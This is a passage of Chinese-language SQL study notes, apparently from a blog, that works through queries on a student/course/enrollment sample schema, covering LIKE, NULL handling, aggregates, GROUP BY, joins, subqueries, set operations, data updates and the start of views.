class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname,sno,ssex</span><br><span class="line"><span class="keyword">from</span> student <span class="keyword">where</span> sname <span class="keyword">like</span> <span class="string">'刘%'</span></span><br></pre></td></tr></table></figure><p><strong>使用换码字符将通配符转义为普通字符</strong></p><p>eg：查询<strong>DB_Design</strong>课程的课程号和学分</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Cno,Ccredit</span><br><span class="line"><span class="keyword">FROM</span> Course</span><br><span class="line"><span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">'DB\_Design'</span> ESCAPE <span class="string">'\ '</span>;</span><br></pre></td></tr></table></figure><p><strong>ESCAPE</strong> &#39;\‘ 表示“ \” 为换码字符</p><h5 id="涉及空值的查询"><a href="#涉及空值的查询" class="headerlink" title="涉及空值的查询"></a>涉及空值的查询</h5><p>eg：查所有有成绩的学生学号和课程号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Cno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Grade <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p><strong>“IS”</strong> 不能用 “<strong>=”</strong> 代替</p><h5 id="多重条件查询"><a href="#多重条件查询" class="headerlink" title="多重条件查询"></a>多重条件查询</h5><p>逻辑运算符:<strong>AND</strong>和 <strong>OR</strong>来连接多个查询条件</p><p>1、<strong>AND</strong>的优先级高于<strong>OR</strong></p><p>2、可以用括号改变优先级</p><p>eg：查询计算机系年龄在<strong>20</strong>岁以下的学生姓名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept= <span class="string">'CS'</span> <span class="keyword">AND</span> Sage&lt;<span class="number">20</span>;</span><br></pre></td></tr></table></figure><h4 id="聚集函数与ORDER-BY子句"><a href="#聚集函数与ORDER-BY子句" class="headerlink" title="聚集函数与ORDER BY子句"></a>聚集函数与ORDER BY子句</h4><p>1、可以按一个或多个属性列排序</p><p>2、升序:<strong>ASC;</strong>降序:<strong>DESC;</strong>缺省值为升序</p><p>3、对于空值，排序时显示的次序由具体系统实现来决定</p><p>eg：查询选修了<strong>3</strong>号课程的学生的学号及其成绩，查询结果按分数降序排列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sno,grade <span class="keyword">from</span> sc</span><br><span class="line"><span class="keyword">where</span> cno=<span class="string">'3'</span> <span class="keyword">order</span> <span class="keyword">by</span> grade <span class="keyword">desc</span></span><br></pre></td></tr></table></figure><p>eg：查询全体学生情况，查询结果按所在系的系号升序 排列，同一系中的学生按年龄降序排列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> sdept,sage <span class="keyword">desc</span></span><br></pre></td></tr></table></figure><p>eg：查询学生总人数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(\*) <span class="keyword">from</span> student</span><br></pre></td></tr></table></figure><p>eg：查询选修了课程的学生人数。 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(<span class="keyword">distinct</span> sno) <span class="keyword">from</span> sc</span><br></pre></td></tr></table></figure><p>eg：计算<strong>1</strong>号课程的学生平均成绩。 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">avg</span>(grade) <span class="keyword">from</span> sc <span class="keyword">where</span> cno=<span class="string">'1'</span></span><br></pre></td></tr></table></figure><p>eg：查询选修<strong>1</strong>号课程的学生最高分数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">max</span>(grade) <span class="keyword">from</span> sc <span class="keyword">where</span> cno=<span class="string">'1'</span></span><br></pre></td></tr></table></figure><p>eg：查询学生<strong>201215121</strong>选修课程的总学分数。 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">sum</span>(ccredit) <span class="keyword">from</span> sc,course</span><br><span class="line"><span class="keyword">where</span> sno=<span class="string">'201215121'</span> <span class="keyword">and</span> sc.cno=course.cno</span><br></pre></td></tr></table></figure><h4 id="GROUP-BY子句"><a href="#GROUP-BY子句" class="headerlink" title="GROUP BY子句"></a>GROUP BY子句</h4><p>eg：查询选修了<strong>3</strong>门以上课程的学生学号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sno <span class="keyword">from</span> sc <span class="keyword">group</span> <span class="keyword">by</span> sno <span class="keyword">having</span> <span class="keyword">count</span>(*) &gt;=<span class="number">3</span></span><br></pre></td></tr></table></figure><p>eg：查询平均成绩大于等于<strong>80</strong>分的学生学号和平均成绩</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sno,<span class="keyword">avg</span>(grade) <span class="keyword">from</span> sc <span class="keyword">group</span> <span class="keyword">by</span> sno</span><br><span class="line"><span class="keyword">having</span> <span class="keyword">avg</span>(grade)&gt;=<span class="number">80</span></span><br></pre></td></tr></table></figure><p><strong>HAVING</strong>短语与<strong>WHERE</strong>子句的区别</p><p>作用对象不同</p><p> <strong>WHERE</strong>子句作用于基表或视图，从中选择满足条件的元组 </p><p><strong>HAVING</strong>短语作用于组，从中选择满足条件的组。</p><h3 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h3><p>连接查询:同时涉及两个以上的表的查询</p><p>连接条件或连接谓词: 用来连接两个表的条件，一般格式:</p><p>1、<strong>[&lt;</strong>表名<strong>1&gt;.]&lt;</strong>列名<strong>1&gt;</strong> <strong>&lt;</strong>比较运算符<strong>&gt;</strong> <strong>[&lt;</strong>表名<strong>2&gt;.]&lt;</strong>列名<strong>2&gt;</strong> </p><p>2、<strong>[&lt;</strong>表名<strong>1&gt;.]&lt;</strong>列名<strong>1&gt;</strong> <strong>BETWEEN</strong> <strong>[&lt;</strong>表名<strong>2&gt;.]&lt;</strong>列名<strong>2&gt;</strong> <strong>AND</strong>[&lt;<strong>表名</strong>2&gt;.]&lt;<strong>列名</strong>3&gt;**</p><h4 id="等值与非等值连接查询"><a href="#等值与非等值连接查询" class="headerlink" title="等值与非等值连接查询"></a>等值与非等值连接查询</h4><h5 id="等值连接"><a href="#等值连接" class="headerlink" title="等值连接"></a>等值连接</h5><p>等值连接:连接运算符为<strong>=</strong></p><p>eg：查询每个学生及其选修课程的情况</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> student.*, sc.* <span class="keyword">from</span> student,sc <span class="keyword">where</span> student.sno=sc.sno</span><br></pre></td></tr></table></figure><h5 id="自然连接"><a href="#自然连接" class="headerlink" title="自然连接"></a>自然连接</h5><p>eg：对上一例用自然连接完成</p><p>自然连接去除了重复的列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> student.sno,sname,ssex,sage,sdept,</span><br><span class="line">cno,grade <span class="keyword">from</span> student, sc</span><br><span class="line"><span class="keyword">where</span> student.sno=sc.sno</span><br></pre></td></tr></table></figure><h5 id="连接操作的执行过程"><a href="#连接操作的执行过程" class="headerlink" title="连接操作的执行过程"></a>连接操作的执行过程</h5><p>嵌套循环法(NESTED-LOOP)<br>1、首先在表1中找到第一个元组，然后从头开始扫描表2，逐 一查找满足连接件的元组，找到后就将表1中的第一个元 组与该元组拼接起来，形成结果表中一个元组。<br>2、表2全部查找完后，再找表1中第二个元组，然后再从头开 始扫描表2，逐一查找满足连接条件的元组，找到后就将 表1中的第二个元组与该元组拼接起来，形成结果表中一 个元组。<br>3、重复上述操作，直到表1中的全部元组都处理完毕</p><h5 id="一条SQL语句可以同时完成选择和连接查询"><a href="#一条SQL语句可以同时完成选择和连接查询" class="headerlink" title="一条SQL语句可以同时完成选择和连接查询"></a>一条<strong>SQL</strong>语句可以同时完成选择和连接查询</h5><p>eg：查询选修<strong>2</strong>号课程且成绩在<strong>90</strong>分以上的所有学生的学号和姓名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Student.sno, sname <span class="keyword">from</span> student,sc</span><br><span class="line"><span class="keyword">where</span> Student.sno=sc.sno <span class="keyword">and</span> sc.cno=<span class="string">'2'</span></span><br><span class="line"><span class="keyword">and</span> grade&gt;<span class="number">90</span></span><br></pre></td></tr></table></figure><p>执行过程：</p><p>1、先从<strong>SC</strong>中挑选出<strong>Cno=’2’</strong>并且<strong>Grade&gt;90</strong>的元组形成一个中间关系</p><p>2、再和<strong>Student</strong>中满足连接条件的元组进行连接得到最终的结果 关系</p><h4 id="自身连接"><a href="#自身连接" class="headerlink" title="自身连接"></a>自身连接</h4><p>自身连接:一个表与其自己进行连接</p><p>需要给表起别名以示区别</p><p>由于所有属性名都是同名属性，因此必须使用别名前缀</p><p>eg：查询每一门课的间接先修课(即先修课的先修课)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> first.cno, second.cpno</span><br><span class="line"><span class="keyword">from</span> course <span class="keyword">first</span>, course <span class="keyword">second</span></span><br><span class="line"><span class="keyword">where</span> first.cpno=second.cno</span><br></pre></td></tr></table></figure><h4 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h4><p>外连接与普通连接的区别</p><p>1、普通连接操作只输出满足连接条件的元组</p><p>2、外连接操作以指定表为连接主体，将主体表中不满足连接条件的元组一并输出</p><p>3、左外连接：列出左边关系中所有的元组</p><p>4、右外连接：列出右边关系中所有的元组</p><p>eg：查询每个学生及其选修课程的情况，没有选修课程的同学也显示出来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> student.sno,sname,ssex,sage,sdept, cno,grade</span><br><span class="line"><span class="keyword">from</span> student <span class="keyword">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> sc <span class="keyword">on</span> (student.sno=sc.sno)</span><br></pre></td></tr></table></figure><h4 id="多表连接"><a href="#多表连接" class="headerlink" title="多表连接"></a>多表连接</h4><p>多表连接:两个以上的表进行连接</p><p>eg：查询每个学生的学号、姓名、选修的课程名及成绩</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> student.sno,sname,cname,grade</span><br><span class="line"><span class="keyword">from</span> student,sc,course</span><br><span class="line"><span class="keyword">where</span> student.sno=sc.sno <span class="keyword">and</span></span><br><span class="line">sc.cno=course.cno</span><br></pre></td></tr></table></figure><h3 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a>嵌套查询</h3><p>一个select-from-where语句称为一个查询块</p><p>将一个查询块嵌套在另一个查询块的where子句或having短语的条件中的查询称为嵌套查询</p><h4 id="带有in谓词的子查询"><a href="#带有in谓词的子查询" class="headerlink" title="带有in谓词的子查询"></a>带有in谓词的子查询</h4><p>eg：外层为父查询，内层为子查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sname</span><br><span class="line"><span class="keyword">from</span> student</span><br><span class="line"><span class="keyword">where</span> sno <span class="keyword">in</span>(<span class="keyword">select</span> sno</span><br><span class="line">            <span class="keyword">from</span> sc</span><br><span class="line">            <span class="keyword">where</span> con=<span class="string">'2'</span>)</span><br></pre></td></tr></table></figure><p>可以多层嵌套，但不能使用order by子句，order by字句只能通对最终查询结果排序</p><h4 id="带有比较运算符的子查询"><a href="#带有比较运算符的子查询" class="headerlink" title="带有比较运算符的子查询"></a>带有比较运算符的子查询</h4><p>当能确切知道内层查询返回单值时，可用比较运算符（&gt;, &lt;, =, &gt;=, &lt;=, !=, &lt; &gt;）</p><p>eg：找出每个学生超过他选修课程平均成绩的课程号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno, Cno</span><br><span class="line"><span class="keyword">FROM</span> sc x</span><br><span class="line"><span class="keyword">WHERE</span> Grade &gt;=( <span class="keyword">SELECT</span> <span class="keyword">AVG</span> (Grade)</span><br><span class="line"><span class="keyword">FROM</span> sc y</span><br><span class="line"><span class="keyword">WHERE</span> y.Sno=x.Sno);</span><br></pre></td></tr></table></figure><h4 id="带有ANY（SOME）或ALL谓词的子查询"><a href="#带有ANY（SOME）或ALL谓词的子查询" class="headerlink" title="带有ANY（SOME）或ALL谓词的子查询"></a>带有ANY（SOME）或ALL谓词的子查询</h4><p>eg：查询非计算机科学系中比计算机科学系任意一个学生年龄小的学生姓名和年龄</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage &lt; <span class="keyword">ANY</span>( <span class="keyword">SELECT</span> Sage</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept=<span class="string">'CS'</span>)</span><br><span class="line"><span class="keyword">AND</span> Sdept&lt;&gt;<span class="string">'CS'</span>;</span><br></pre></td></tr></table></figure><h4 id="带有EXISTS谓词的子查询"><a href="#带有EXISTS谓词的子查询" class="headerlink" title="带有EXISTS谓词的子查询"></a>带有EXISTS谓词的子查询</h4><p>存在量词 </p><p>带有EXISTS谓词的子查询不返回任何数据，只产生逻辑真值”true“或逻辑假值”false“</p><p>若内层查询结果非空，则外层的WHERE子句返回真值</p><p>若内层查询结果为空，则外层的WHERE子句返回假值</p><p>NOT EXISTS谓词返回的值与之相反</p><p>eg：查询所有选修了1号课程的学生姓名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span>( <span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Sno=Student.Sno <span class="keyword">AND</span> Cno=<span class="string">'1'</span>);</span><br></pre></td></tr></table></figure><h5 id="用EXISTS-NOT-EXISTS实现全称量词"><a href="#用EXISTS-NOT-EXISTS实现全称量词" class="headerlink" title="用EXISTS/NOT EXISTS实现全称量词"></a>用<strong>EXISTS</strong>/<strong>NOT EXISTS</strong>实现全称量词</h5><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master/blogimg/mysql-1.png"  alt=""></p><p>eg：查询至少选修了学生<strong>201215122</strong>选修的全部课程的学生号码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> sno</span><br><span class="line"><span class="keyword">FROM</span> SC SCX</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>( <span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> SC SCY</span><br><span class="line"><span class="keyword">WHERE</span> SCY.Sno=<span class="string">'201215122'</span> <span class="keyword">AND</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> SC SCZ</span><br><span class="line"><span class="keyword">WHERE</span> SCZ.sno=SCX.Sno <span class="keyword">AND</span> SCZ.Cno=SCY.Cno));</span><br></pre></td></tr></table></figure><h3 id="集合查询"><a href="#集合查询" class="headerlink" title="集合查询"></a>集合查询</h3><p>集合操作的种类：</p><p>并操作：UNION   </p><p>交操作：INTERSECT</p><p>差操作：EXCEPT</p><p>参加集合各项操作的各查询结果的列数必须相同；对应项的数据类型也必须相同。</p><p>eg：查询计算机科学系的学生及年龄不大于19岁的学生</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * </span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept= <span class="string">'CS'</span> </span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage&lt;=<span class="number">19</span>;</span><br></pre></td></tr></table></figure><p>UNION：将多个查询结果合并起来时，系统自动去掉重复元组</p><p>UNION ALL：将多个查询结果合并起来时，保留重复元组</p><h3 id="基于派生表的查询"><a href="#基于派生表的查询" class="headerlink" title="基于派生表的查询"></a>基于派生表的查询</h3><p>子查询不仅可以出现在WHERE子句、Having短语，也可以出现在FROM子句中</p><p>子查询生成的临时派生表（Derived Table）成为主查询的查询对象</p><p>eg：找出每个学生超过他选修课程平均成绩的课程号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Cno</span><br><span class="line"><span class="keyword">FROM</span> SC,(<span class="keyword">SELECT</span> sno,<span class="keyword">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno)</span><br><span class="line"><span class="keyword">AS</span> Avg_sc(avg_sno,avg_grade)</span><br><span class="line"><span class="keyword">WHERE</span> SC.Sno=Avg_sc.avg_sno <span class="keyword">AND</span> SC.Grade&gt;=Avg_sc.avg_grade</span><br></pre></td></tr></table></figure><h2 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a>数据更新</h2><h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><h4 id="插入元组"><a href="#插入元组" class="headerlink" title="插入元组"></a>插入元组</h4><p>eg：<strong>将一个新学生元组(学号:</strong>201215128; <strong>姓名:陈冬</strong>; <strong>性别:男</strong>; <strong>所在系:</strong>IS; <strong>年龄:</strong>18岁)插入到Student表中。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span> Student(Sno,Sname,Ssex,Sdept,Sage)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">'201215128'</span>,<span class="string">'陈东'</span>,<span class="string">'男'</span>,<span class="string">'IS'</span>,<span class="number">18</span>);</span><br></pre></td></tr></table></figure><p>可以与表中的列顺序不同，但必须一一对应</p><p>eg：将学生张成民的信息插入到Student表中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span> Student</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">'201215126'</span>,<span class="string">'张成民'</span>,<span class="string">'男'</span>,<span class="number">18</span>,<span class="string">'CS'</span>);</span><br></pre></td></tr></table></figure><p>此时必须和创建的表一一对应</p><p>eg：插入一条选课记录( ‘200215128’, ‘1 ‘)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span> SC(Sno,Cno)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">'201215128'</span>,<span class="string">'1'</span>);</span><br></pre></td></tr></table></figure><p>此时在Grade列上会自动赋空值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span> SC</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="string">'201215128'</span>,<span class="string">'1'</span>,<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h4 id="插入子查询结果"><a href="#插入子查询结果" class="headerlink" title="插入子查询结果"></a>插入子查询结果</h4><p>eg：对每一个系，求学生的平均年龄，并把结果存入数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Dept_age</span><br><span class="line">(Sdept <span class="built_in">CHAR</span>(<span class="number">15</span>),</span><br><span class="line">Avg_age <span class="built_in">SMALLINT</span>);</span><br><span class="line"><span class="keyword">INSERT</span></span><br><span class="line"><span class="keyword">INTO</span> Dept_age(Sdept,Avg_age)</span><br><span class="line"><span class="keyword">SELECT</span> Sdept,<span class="keyword">AVG</span>(Sage)</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sdept;</span><br></pre></td></tr></table></figure><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><h4 id="修改元组值"><a href="#修改元组值" class="headerlink" title="修改元组值"></a>修改元组值</h4><p>eg：将学生201215121的年龄改为22岁</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> Student</span><br><span class="line"><span class="keyword">SET</span> Sage=<span class="number">22</span></span><br><span class="line"><span class="keyword">WHERE</span> Sno=<span class="string">'201215121'</span></span><br></pre></td></tr></table></figure><p>如果更改表中所有值，则可以不添加WHERE条件</p><h4 id="带子查询的修改语句"><a href="#带子查询的修改语句" class="headerlink" title="带子查询的修改语句"></a>带子查询的修改语句</h4><p>eg：<strong>将计算机科学系全体学生的成绩置零</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> SC</span><br><span class="line"><span class="keyword">SET</span> Grade=<span class="number">0</span></span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">IN</span>(</span><br><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept=<span class="string">'CS'</span>);</span><br></pre></td></tr></table></figure><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p>eg：删除学号为201215128的成绩记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Sno=<span class="string">'201215128'</span>;</span><br></pre></td></tr></table></figure><p>eg：删除计算机科学系所有学生的选课记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">IN</span>(</span><br><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept=<span class="string">'CS'</span>);</span><br></pre></td></tr></table></figure><h2 id="空值的处理"><a href="#空值的处理" class="headerlink" title="空值的处理"></a>空值的处理</h2><h3 id="空值的产生"><a href="#空值的产生" class="headerlink" title="空值的产生"></a>空值的产生</h3><p>eg：将Student表中学生号为“201215123”的学生所属的系改为空值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> Student</span><br><span class="line"><span class="keyword">SET</span> Sdept=<span class="literal">NULL</span></span><br><span class="line"><span class="keyword">WHERE</span> Sno=<span class="string">'201215123'</span>;</span><br></pre></td></tr></table></figure><h3 id="空值的判断"><a href="#空值的判断" class="headerlink" title="空值的判断"></a>空值的判断</h3><p>用IS NULL或IS NOT NULL来进行判断</p><p>eg：从Student表中找出漏填了数据的学生信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">IS</span> <span class="literal">NULL</span> <span class="keyword">OR</span> Ssex <span class="keyword">IS</span> <span class="literal">NULL</span> <span class="keyword">OR</span> Sage <span class="keyword">IS</span> <span class="literal">NULL</span> <span class="keyword">OR</span> Sdept <span class="keyword">IS</span> <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><h3 id="空值的约束条件"><a href="#空值的约束条件" class="headerlink" title="空值的约束条件"></a>空值的约束条件</h3><p>有NOT NULL约束条件的不能取空值</p><p>加了UNIQUE限制的不能取空值</p><p>码属性不能取空值</p><h3 id="空值的运算"><a href="#空值的运算" class="headerlink" title="空值的运算"></a>空值的运算</h3><p>算术运算：结果为空</p><p>比较运算：结果为UNKNOWN</p><p>逻辑运算：有UNKNOWN后，传统二值（TRUE，FALSE）逻辑扩展成三值逻辑。</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master/blogimg/mysql-2.png"  alt=""></p><p>eg：找出选修1号课程的不及格的学生以及缺考的学生</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno=<span class="string">'1'</span><span class="keyword">AND</span>(Grade&lt;<span class="number">60</span> <span class="keyword">OR</span> Grade <span class="keyword">IS</span> <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h2 id="定义视图"><a href="#定义视图" class="headerlink" title="定义视图"></a>定义视图</h2><p>视图：虚表，是从一个或几个基本表(或视图)导出的表</p><p>只存放视图的定义，不存放视图对应的数据</p><p>基表中的数据发生变化，从视图中查询出的数据也随之改变</p><h3 id="建立视图"><a href="#建立视图" class="headerlink" title="建立视图"></a>建立视图</h3><p>WITH CHECK OPTION：对视图进行UPDATE，INSERT和DELETE操作时，保证更新、插入或删除的行满足<strong>视图定义中的谓词条件</strong>(即子查询中的条件表达式)</p><p>建立视图时SELECT后也可写 * ，但是缺点是修改基表的结构后，基表与视图的映象关系被破坏，导致该视图不能正确工作。</p><h4 id="行列子集视图"><a 